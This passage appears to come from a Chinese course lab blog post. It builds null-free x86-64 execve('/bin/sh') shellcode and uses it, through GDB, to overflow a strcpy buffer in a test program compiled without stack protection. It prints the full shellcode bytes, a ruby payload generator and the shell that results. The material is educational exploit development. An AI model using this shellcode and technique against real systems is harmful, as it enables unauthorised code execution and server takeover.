│0x40ef0e &lt;_exit+78&gt; jmp 0x40eeef &lt;_exit+47&gt; 不得不说，分析exit的汇编指令比分析execve要难得多，因为这里面涉及到了3层调用，尤其是__run_exit_handlers，看着就头痛。更悲剧的是，由于syscall前面有近百条汇编指令，系统调用的参数可能在之前某一条指令中就已经存入寄存器了，如果要分析出该系统调用具体有哪些必需参数，貌似我们只能把每一条指令都弄明白。不过程序员可不是苦力，怎么能干这种吃力不讨好的事呢？肯定有投机取巧的方法！ 不同于32位机的堆栈传递参数，对于64位机，我们知道，函数调用的参数是通过寄存器传递的，而常用的寄存器就那么几个，分别是%rdi、%rsi、%rdx、%rax，因此，我们完全可以在执行syscall指令前把这几个寄存器的值全部抓下来，不管是不是真正的参数，总之我在使用的时候就按这个进行赋值，这样总能执行成功吧！话不多说，立马实践，使用GDB跟踪程序到syscall指令，然后查看四个参数寄存器的值： 这样，我们也就获得了调用exit的几个必要条件： 1. 将0xe7存入%rax(实际上是%eax)中 2. 将0x0存入%rdx中 3. 将0x0存入%rdi中 4. 将0x3c分别存入%rsi中 5. 系统调用，syscall指令 根据以上需求，我们可以设计出能够产生exit系统调用的代码段： 12345678910# exit.smain: movl $0xe7, %eax # 对应第1点需求 movq $0x0, %rdx # 对应第2点需求 movq $0x0, %rdi # 对应第3点需求 movq $0x3c, %rsi # 对应第4点需求 syscall # 对应第5点需求 .global main .type main, @function 使用gcc将这段代码汇编成可执行文件，然后使用GDB跟踪调试，发现执行完syscall指令后，该进程正常退出，这表明我们设计的代码能够正常产生exit系统调用。1234(gdb) ni[Inferior 1 (process 764) exited normally]warning: Error removing breakpoint -9(gdb) 不过，经过测试(其实就是依次修改各个参数寄存器的值，查看程序能否正常退出)，我们会发现，列出的5点需求中，只有第1、3、5点需求是必要的，其余两点需求可以忽略，因此，我们的代码可以继续精简两行，直接把movq $0x0, %rdx和movq $0x3c, %rsi删掉即可。 至此，我们可以将两串代码拼接在一起：1234567891011121314151617181920# shell_2.smain: jmp bbbaaa: movq $0x0, %rax movq %rax, 0x8(%rsp) movq 0x0(%rsp), %rdi lea 0x0(%rsp), %rsi movq $0x0, %rdx movl $0x3b, %eax syscall movl $0xe7, %eax movq $0x0, %rdi syscallbbb: callq aaa .string "/bin/sh" .global main .type main, @function 这个程序不仅能够产生execve系统调用，执行shell，还能在execve系统调用失败时正常退出，以免发生错误。理论上来说，这段代码已经基本满足我们对shell code的功能需求，然而，它却无法使用。为了说明这一点，我们可以查看一下这些指令对应的机器码： 123456789101112131415161718192021223130104006@hamsa:~/project2$ objdump -d shell_2 | grep -A20 '&lt;main&gt;'0000000000401164 &lt;main&gt;: 401164: eb 30 jmp 401196 &lt;bbb&gt;0000000000401166 &lt;aaa&gt;: 401166: 48 c7 c0 00 00 00 00 mov $0x0,%rax 40116d: 48 89 44 24 08 mov %rax,0x8(%rsp) 401172: 48 8b 3c 24 mov (%rsp),%rdi 401176: 48 8d 34 24 lea (%rsp),%rsi 40117a: 48 c7 c2 00 00 00 00 mov $0x0,%rdx 401181: b8 3b 00 00 00 mov $0x3b,%eax 401186: 0f 05 syscall 401188: b8 e7 00 00 00 mov $0xe7,%eax 40118d: 48 c7 c7 00 00 00 00 mov $0x0,%rdi 401194: 0f 05 syscall0000000000401196 &lt;bbb&gt;: 401196: e8 cb ff ff ff callq 401166 &lt;aaa&gt; 40119b: 2f (bad) 40119c: 62 (bad) 40119d: 69 6e 2f 73 68 00 90 imul $0x90006873,0x2f(%rsi),%ebp 4011a4: 90 nop 注意到，我们设计的汇编代码在翻译成机器指令后，出现了大量的\x00字段，这在代码注入环节是不可接受的！因为buffer overflow的攻击目标是那些使用了批量写内存操作的程序，比如常见的gets()、strcpy函数，这些函数一般具有同一个特征——没有指定向内存中写多少字节。举个例子，对于字符串拷贝函数strcpy，它以字节为单位，从源地址读取数据，向目的地址写入数据，然后源地址和目的地址同时递增，继续下一次拷贝，直至遇到\x00时终止操作，因为这是字符串的结束标记。由此可见，假设我们利用strcpy函数将之前设计的机器码注入到内存，那么仅有第一个\x00前面的内容(这里即\xeb\x29\x48\xc7\c0)能够注入，后面的内容都将被忽略，这显然是一次失败的攻击。 为了解决这一缺陷，我们需要人为地消除\x00。幸运的是，我们的攻击目标是一台x86的机器，CISC架构使得它的指令长度是不固定的，从而能够获得非常高的指令密度，我们利用这一特性，可以对设计的指令做一些小的修改，消除\x00的存在。具体如下所示：123movq $0x0,%rax ----&gt; xor %rax,%raxmovq $0x0,%rdx ----&gt; xor %rdx,%rdxmovl $0x3b,%eax ----&gt; movb $0x3b,%al 其实原理很简单，无非就是消除立即数中的\x00字段，这可以通过使用其他指令或者分割立即数来实现。 最终我们得到的无\x00版汇编代码如下所示：123456789101112131415161718192021# shell_3.smain: jmp bbbaaa: xor %rax, %rax movq %rax, 0x8(%rsp) movq 0x0(%rsp), %rdi lea 0x0(%rsp), %rsi xor %rdx, %rdx movb $0x3b, %al syscall xor %rax, %rax movb $0xe7, %al xor %rdi, %rdi syscallbbb: callq aaa .string "/bin/sh" .global main .type main, @function 对应机器码如下所示，可以看到代码部分已经不存在\x00字段了：123456789101112131415161718192021223130104006@hamsa:~/project2$ objdump -d shell_3 | grep -A20 '&lt;main&gt;'0000000000401164 &lt;main&gt;: 401164: eb 21 jmp 401187 &lt;bbb&gt;0000000000401166 &lt;aaa&gt;: 401166: 48 31 c0 xor %rax,%rax 401169: 48 89 44 24 08 mov %rax,0x8(%rsp) 40116e: 48 8b 3c 24 mov (%rsp),%rdi 401172: 48 8d 34 24 lea (%rsp),%rsi 401176: 48 31 d2 xor %rdx,%rdx 401179: b0 3b mov $0x3b,%al 40117b: 0f 05 syscall 40117d: 48 31 c0 xor %rax,%rax 401180: b0 e7 mov $0xe7,%al 401182: 48 31 ff xor %rdi,%rdi 401185: 0f 05 syscall0000000000401187 &lt;bbb&gt;: 401187: e8 da ff ff ff callq 401166 &lt;aaa&gt; 40118c: 2f (bad) 40118d: 62 (bad) 40118e: 69 6e 2f 73 68 00 90 imul $0x90006873,0x2f(%rsi),%ebp 需要注意的是，不只是\x00，在某些场景下，\x0A、\x0D、\x20以及\x08这些特殊字符也会影响到代码的注入，这个就要具体问题具体分析了，不能一概而论，总之，大家可以暂时忽略这些隐患，而在真正注入代码时，观察能否注入成功，如果不能，再根据具体原因来修改代码，千万不要空想代码可能存在哪些bug。 我最初做到这里的时候，就直接开始做下一步工作了，但事实上这段代码还存在一个问题，虽然现在单独使用并没有任何影响，但在真正注入时会使得攻击失效。为了方便，我直接在这里提出来，其实就是字符串末尾必须填入一个\x00，否则传入execve的参数不再是/bin/sh字符串，而是/bin/sh***，这样会导致系统调用失败；同时，又考虑到\x00会终止整个的代码的注入，所以我们不能简单地补上一个\x00。这时我们该怎么做呢？答案其实也不难，直接在代码里对字符串末尾的字节进行修改，赋值为0就好了嘛！所以，最终我们将使用的shell code是这样的： 1234567891011121314151617181920main: jmp bbbaaa: xor %rax, %rax movq %rax, 0x8(%rsp) movq 0x0(%rsp), %rdi movb %al, 0x7(%rdi) # %rdi为字符串起始地址，这里就是将第8个字符赋值为0 lea 0x0(%rsp), %rsi movb $0x3b, %al syscall xor %rax, %rax movb $0xe7, %al xor %rdi, %rdi syscallbbb: callq aaa .string "/bin/sh" .global main .type main, @function 需要注意的是，不同于前面几版的shell code，最终版的程序是无法单独运行的，因为指令movb %al, 0x7(%rdi)有对代码段(code section，只读区域)进行修改，这是不被允许的，所以程序在执行到这条指令时，会产生错误Segmentation fault (core dumped)。但不用担心，当我们将这段代码注入到目标程序以后，它又是可以运行的了！因为我们是将代码注入到目标程序的栈中，我们知道栈空间的数据是可以修改的，不像代码段那样只可读不可写。 不过为了证明最终的代码可以工作，我们还是能设计一个简单的测试程序来验证的：123456789101112// test_final.cchar shellcode[] = "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh";// 汇编代码翻译后得到的机器码void shell() &#123; long long *ret; ret = (long long *)&amp;ret + 0x2; // 这一步有些tricky，其实作用就是使ret指向函数返回地址 *ret = (long long)shellcode; // 有了上一步，这里我们就可以修改返回地址，使程序跳转到shellcode&#125;int main() &#123; shell(); return 0;&#125; 这里稍微解释一下程序中最为关键的一步：ret = (long long *)&amp;ret + 0x2;。参照我的另一篇博文Buffer Overflow(理论篇)，在程序执行过程中，栈的结构是这样的：12345678910111213# stack +----------------+entry %rbp ----&gt; |.. prev frame ..| | | | | +----------------+entry %rsp ----&gt; | return address | # 我们要修改的是这个位置 +----------------+new %rbp ----&gt; | saved %rbp | +----------------+ | Local | # &lt;------ ret指针就在这里new %rsp ----&gt; | Variables | +----------------+ 对于64位系统，return address、saved %rbp以及long long *所占用的空间都是8字节，因此，return address的地址要比ret的地址大16个字节，也就是2个long long *的长度！这么一说，想必大家都已经明白ret = (long long *)&amp;ret + 0x2的原理了，它最终会使得ret指向函数返回地址，从而我们能够通过修改*ret来实现对返回地址的修改。 最终测试程序运行如下所示： 至此，第一部分工作正式完成，我们已经为buffer overflow攻击打下了很好的基础，下面就是真正的实践了。 Exploit Buffer Overflow with GDB 我们已经完成恶意代码的设计，下面我们开始尝试将代码注入到一个很weak的程序中，使它能够按照我们的意愿来工作(其实就是执行shell啦)。目标程序代码如下所示： 123456789101112// victim.c#include &lt;stdio.h&gt;#include &lt;string.h&gt;void foo(char *arg) &#123; char buffer[64]; strcpy(buffer, arg);&#125;int main(int argc, char *argv[]) &#123; foo(argv[1]); return(0);&#125; 1234567# 编译目标代码3130104006@hamsa:~/project3$ gcc victim.c -g -Wall -fno-stack-protector -z execstack -static -o victim# -g 表示生成调试信息，方便使用GDB调试# -Wall 表示打开警告开关，提示所有warning信息# -fno-stack-protector 表示禁用栈保护机制，如果没有这个选项，本次实验无法完成。这里的栈保护机制其实就是canary# -z execstack 表示允许栈可执行，没有这个选项，本次实验也无法完成# -static 表示静态链接 为什么说这个程序很weak呢？这里用过Visual Studio的同学一定很有感受，如果我们的工程里有使用gets、strcpy这样的函数，那么编译时IDE一定会抱怨这些函数是dangerous的，蛋疼的是，它报的不是warning，而是error，这样也就导致工程无法编译。我们的目标程序刚好使用到了strcpy函数，这让我们有可趁之机，因为该函数并没有做边界限制，理论上来说，只要不遇到终止符\x00，它就会一直进行内存拷贝，我们利用这一特性，可以输入一串很长的数据，然后通过strcpy拷贝到本地变量buffer中，但由于我们输入的数据长度要超过buffer的长度，甚至还会覆盖到foo函数的返回地址字段，所以我们还能利用输入的数据将函数返回地址修改掉，使程序返回时跳到我们规定的位置(一般是注入代码的起始地址，也就是buffer的地址)，执行我们注入的代码，这就是buffer overflow攻击的一种实现原理。 根据实验原理，为了实现攻击，除了需要一段恶意代码之外，我们还需要知道这段恶意代码注入到内存中后的起始地址，如此才能正确覆写程序返回地址。这里，我们可以使用GDB来跟踪程序的运行，查看程序进入foo函数后，buffer的起始地址是多少。123456789101112131415161718# Debug victim program with GDB ┌─────────────────────────────────────────────────────────────────────────┐ │0x401164 &lt;foo&gt; push %rbp │ │0x401165 &lt;foo+1&gt; mov %rsp,%rbp │ │0x401168 &lt;foo+4&gt; sub $0x50,%rsp │ │0x40116c &lt;foo+8&gt; mov %rdi,-0x48(%rbp) │ │0x401170 &lt;foo+12&gt; mov -0x48(%rbp),%rdx # 将argv[1]的地址赋给%rdx│ │0x401174 &lt;foo+16&gt; lea -0x40(%rbp),%rax # 将buffer的地址赋给%rax │ &gt;│0x401178 &lt;foo+20&gt; mov %rdx,%rsi # 程序暂时停在这个位置 │ │0x40117b &lt;foo+23&gt; mov %rax,%rdi │ │0x40117e &lt;foo+26&gt; callq 0x400320 # strcpy函数调用 │ │0x401183 &lt;foo+31&gt; leaveq │ │0x401184 &lt;foo+32&gt; retq │ └─────────────────────────────────────────────────────────────────────────┘child process 17315 In: foo Line: 6 PC: 0x401178(gdb) p/x $rax$1 = 0x7fffffffe3d0 # 根据0x401174这条指令，我们知道buffer地址存放在%rax寄存器中(gdb) 由上，我们知道buffer的起始地址是0x7fffffffe3d0，理论上来说，这个应该就是注入代码的起始地址了。有的同学可能会怀疑这个地址只是一个随机数，下次执行时就不一样了。这样的想法非常合理，然而，如果再多测试几次，我们会惊讶地发现，这个值还真是固定的，并不是随机分配的。这是因为，GDB默认会关闭stack randomization，也就是说，在不受其他外界因素影响的前提下，调试程序每次开始执行时的栈顶地址都是固定的，从而buffer的地址也不会变。我们可以通过show disable-randomization来查看GDB是否已关闭stack-randomization，也可以通过set disable-randomization on/off修改这一选项：12345(gdb) show disable-randomizationDisabling randomization of debuggee's virtual address space is on.(gdb) set disable-randomization off(gdb) set disable-randomization on(gdb) 好，现在我们有了恶意代码，也有了代码注入后的起始地址，接下来就是研究栈的结构，方便我们准确地修改到函数返回地址：12345678910111213141516171819# stack for foo function +----------------+ | ... | # main function's frame +----------------+ | return address | # 我们要修改的是这个位置 +----------------+ %rbp ----&gt; | saved %rbp | +----------------+ | buffer[63:56] | | buffer[55:48] | | buffer[47:40] | | buffer[39:32] | | buffer[31:24] | | buffer[23:16] | | buffer[15:8] | | buffer[7:0] | # 地址为0x7fffffffe3d0 | ... | %rsp ----&gt; | ... | +----------------+ 我们输入的数据将会从buffer[0]开始，一直往上填充，直至将return address字段修改。我们的实验主机为64位系统，可以计算出，我们需要至少先输入72字节的数据，才能开始修改return address字段，而我们希望将返回地址修改为0x7fffffffe3d0，所以，我们总共需要输入78字节的数据。下面，我们来构造输入数据。 首先，毋庸置疑，我们需要将恶意代码作为输入数据的一部分，这里我把它放在输入数据的最前方：12# 恶意代码总共50字节\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh 现在我们还22个字节才能达到72字节，而事实上，这22个字节的数据是不起作用的，因为程序执行完恶意代码后就会自动退出，所以这22个字节我们可以自己随便凑，但是注意别作死地选\x00、\x20这样的数，它们会终止代码的注入，这里我建议大家使用\x90，因为这在x86机器上是NOP指令的机器码，所以不管我们把\x90添加在什么位置(可以在恶意代码前，也可以在恶意代码中，只要不是一条指令中间–!)，都不会影响程序的正常执行。 通过添加\x90将数据填充到72字节后，我们就可以将地址0x7fffffffe3d0添加到输入数据的末尾：1\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh\x90...\x90\xd0\xe3\xff\xff\xff\x7f 这里千万要注意小端机与大端机的区别，这会影响到地址0x7fffffffe3d0的表示，在小端机里，它要通过\xd0\xe3\xff\xff\xff\x7f来表示。 我们将构造的输入数据保存到文件evil.bin中，方便以后使用。继续使用GDB调试，以evil.bin文件内容作为输入，运行目标程序，观察攻击是否生效：12345678910111213141516171819202122232425262728293130104006@hamsa:~/project3$ ruby -e 'print "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh"+"\x90"*22+"\xd0\xe3\xff\xff\xff\x7f"' &gt; evil.bin3130104006@hamsa:~/project3$ gdb -q victimReading symbols from /home/3130104006/project3/victim...done.(gdb) b fooBreakpoint 1 at 0x401170: file victim.c, line 6.(gdb) r `cat evil.bin`Starting program: /home/3130104006/project3/victim `cat evil.bin`## ...#B+ │0x401170 &lt;foo+12&gt; mov -0x48(%rbp),%rdx │ │0x401174 &lt;foo+16&gt; lea -0x40(%rbp),%rax │ │0x401178 &lt;foo+20&gt; mov %rdx,%rsi │ │0x40117b &lt;foo+23&gt; mov %rax,%rdi │&gt; │0x40117e &lt;foo+26&gt; callq 0x400320 │ &gt;│0x401183 &lt;foo+31&gt; leaveq # 程序暂时停在这里 │ │0x401184 &lt;foo+32&gt; retq │ │0x401185 &lt;main&gt; push %rbp │ │0x401186 &lt;main+1&gt; mov %rsp,%rbp │ │0x401189 &lt;main+4&gt; sub $0x10,%rsp │ │0x40118d &lt;main+8&gt; mov %edi,-0x4(%rbp) │ │0x401190 &lt;main+11&gt; mov %rsi,-0x10(%rbp) │ │0x401194 &lt;main+15&gt; mov -0x10(%rbp),%rax │ │0x401198 &lt;main+19&gt; add $0x8,%rax │ └─────────────────────────────────────────────────────────────────────────┘child process 20231 In: foo Line: 7 PC: 0x401183(gdb) x/2gx $rbp0x7fffffffe3c0: 0x9090909090909090 0x00007fffffffe3d0(gdb) 当程序执行完对strcpy的调用，停在0x401183处时，我们利用x命令查看栈数据，发现%rbp + 8存放的就是我们之前注入的返回地址0x7fffffffe3d0，这说明我们的注入步骤成功啦！于是，小明自信地敲下c键，满怀信心地期待着攻击的生效，结果让他一脸懵逼的一幕出现了：123456789101112131415161718192021222324# 程序跑飞了～～ ┌─────────────────────────────────────────────────────────────────────────┐ &gt;│0x7fffffffe3d2 (bad) │ │0x7fffffffe3d3 (bad) │ │0x7fffffffe3d4 (bad) │ │0x7fffffffe3d5 jg 0x7fffffffe3d7 │&gt; │0x7fffffffe3d7 add %al,(%rax) │ │0x7fffffffe3d9 add %al,(%rax) │ │0x7fffffffe3db add %al,(%rdx) │ │0x7fffffffe3dd add %al,(%rax) │ │0x7fffffffe3df add %al,(%rax) │ │0x7fffffffe3e1 add %al,(%rax) │ │0x7fffffffe3e3 add %al,(%rax) │ │0x7fffffffe3e5 add %al,(%rax) │ │0x7fffffffe3e7 add %al,0x40(%rbx,%rdx,1) │ │0x7fffffffe3eb add %al,(%rax) │ └─────────────────────────────────────────────────────────────────────────┘child process 21114 In: Line: ?? PC: 0x7fffffffe3d2(gdb) cContinuing.Program received signal SIGILL, Illegal instruction.0x00007fffffffe3d2 in ?? ()(gdb) Illegal instruction？为啥会这样呢？我们不是已经做好一切工作了嘛！有了恶意代码，也知道了恶意代码的起始地址，甚至还成功将函数的返回地址修改成了恶意代码的起始地址，按理来说，程序返回后就应该去执行我们的恶意代码呀。 然而，这是幻觉。我们可以看一下0x7fffffffe3d0附近的指令，是不是很奇怪，这根本不是我们设计的恶意代码呀！这时错误原因很明显了，0x7fffffffe3d0原来不是恶意代码的起始位置！ 这似乎有些矛盾。我们前面提到GDB有关闭stack randomization，那么程序的初始栈顶地址应该是不变的，从而buffer的地址也不应该变。但事实并不是这样，因为我们忽视了一个条件：不受其他外界因素的影响。这里出现的外界因素是什么呢？其实就是我们输入的数据自身，要知道我们把这些数据作为参数传给main函数时，它们是要被压入堆栈的，这会使得栈顶地址变得更小，从而buffer对应的地址也会更小，不再是原来的0x7fffffffe3d0了。我们需要重新获取正确的buffer地址，这次我们还是将evil.bin作为参数：12345678910111213141516# 获取正确的buffer地址 ┌─────────────────────────────────────────────────────────────────────────┐B+ │0x401170 &lt;foo+12&gt; mov -0x48(%rbp),%rdx │ │0x401174 &lt;foo+16&gt; lea -0x40(%rbp),%rax │ &gt;│0x401178 &lt;foo+20&gt; mov %rdx,%rsi # 程序暂时停在这里 │ │0x40117b &lt;foo+23&gt; mov %rax,%rdi │ │0x40117e &lt;foo+26&gt; callq 0x400320 │ │0x401183 &lt;foo+31&gt; leaveq │ │0x401184 &lt;foo+32&gt; retq │ │0x401185 &lt;main&gt; push %rbp │ │0x401186 &lt;main+1&gt; mov %rsp,%rbp │ └─────────────────────────────────────────────────────────────────────────┘child process 21854 In: foo Line: 6 PC: 0x401178(gdb) p/x $rax$1 = 0x7fffffffe380(gdb) 原来0x7fffffffe380才是真正的buffer地址，话不多说，赶紧修改evil.bin中的数据，将\xd0\xe3\xff\xff\xff\x7f换为\x80\xe3\xff\xff\xff\x7f，然后重新使用GDB观察攻击是否生效：1234567891011121314151617181920# 重新测试3130104006@hamsa:~/project3$ ruby -e 'print "\xeb\x24\x48\x31\xc0\x48\x89\x44\x24\x08\x48\x8b\x3c\x24\x88\x47\x07\x48\x8d\x34\x24\x48\x31\xd2\xb0\x3b\x0f\x05\x48\x31\xc0\xb0\xe7\x48\x31\xff\x0f\x05\xe8\xd7\xff\xff\xff/bin/sh"+"\x90"*22+"\x80\xe3\xff\xff\xff\x7f"' &gt; evil.bin3130104006@hamsa:~/project3$3130104006@hamsa:~/project3$ gdb victim -qReading symbols from /home/3130104006/project3/victim...done.(gdb) r `cat evil.bin`Starting program: /home/3130104006/project3/victim `cat evil.bin`warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffd000process 22411 is executing new program: /bin/dash$$ echo $0/bin/sh$$ uptime 10:33:04 up 5 days, 4:58, 13 users, load average: 0.00, 0.01, 0.05$$ exit[Inferior 1 (process 22411) exited normally](gdb) q3130104006@hamsa:~/project3$ 哇！这次是真正的成功了。我们看到，在利用evil.bin内的数据作为程序参数时，程序会自动执行/bin/sh，我们也能在这个shell中执行一些常用的Linux命令。这就是一次非常简单的buffer overflow攻击呀！ 可能有些同学看到这里，会觉得这个攻击好low啊，就跑了一个shell，又不是拿到了什么管理员密码啥的，并没有什么作用嘛。其实不然，跑出一个shell是一件很有意义的事！试想一下，假设某个网站有一个输入框，要求用户输入自己的账号，而聪明的你发现经过某些特别的手段(不一定是buffer overflow)，能够使网站后台程序接收到你的输入后跑出shell，此时你一定乐坏了。因为你能够通过输入命令查看到服务器的很多重要信息！注意，此时你的身份不一定是root，这取决于执行网站程序的用户身份，如果刚好是root在跑这个网站程序，那么恭喜你，你拥有了root的权限，这台服务器已经属于你了；如果不是，那也不要紧，起码这个服务器的一部分已经属于你。 Exploit Buffer Overflow without GDB 下面介绍一下，不用GDB怎么实现buffer overflow。// TODO 12345678910111213141516171819202122232425262728~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:26$ echo $0zsh~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:28$ gcc victim.c -g -Wall -fno-stack-protector -z execstack -static -o victim~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:30$ ./victim `cat input.bin`$$ echo $0/bin/sh$$ ls -ltotal 2588-rw-r--r-- 1 hac hac 79 May 9 20:32 input.bin-rw-r--r-- 1 hac hac 49 May 8 10:48 shellcode.bin-rwxr-xr-x 1 hac hac 874196 May 9 20:17 sp-rw-r--r-- 1 hac hac 428 May 9 20:16 sp.c-rwxr-xr-x 1 hac hac 874200 May 9 20:35 test-rw-r--r-- 1 hac hac 169 May 9 20:35 test.c-rwxr-xr-x 1 hac hac 874202 May 9 20:39 victim-rw-r--r-- 1 hac hac 169 May 9 20:37 victim.c$$ exit~/Documents/Network_Penetration_and_Security/project3 ⌚ 20:39:49$ Reference Smashing The Stack For Fun And Profit(非常详细的说明，也是MIT 6-858推荐的阅读材料) Lecture Homepage(仅学校内网可以访问)]]></content>
      <tags>
        <tag>Security</tag>
        <tag>Assembly</tag>
        <tag>Buffer Overflow</tag>
      </tags>
  </entry>
</search>
